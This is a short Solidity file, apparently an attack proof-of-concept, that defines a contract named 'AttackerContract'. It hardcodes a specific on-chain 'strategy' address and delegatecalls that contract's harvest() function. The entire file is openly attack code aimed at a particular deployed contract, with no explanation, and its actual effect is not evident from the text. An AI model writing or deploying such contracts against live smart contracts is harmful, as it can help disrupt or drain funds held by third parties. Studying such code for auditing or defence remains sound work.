pragma solidity >=0.4.22 <0.7.0;

interface IStrategy {
    function harvest() external;
}


contract AttackerContract {
  address public constant strategy = address(0x395F93350D5102B6139Abfc84a7D6ee70488797C);

  function delegatecallHarvest() public {
    strategy.delegatecall(abi.encode(bytes4(keccak256("harvest()"))));
  }
}
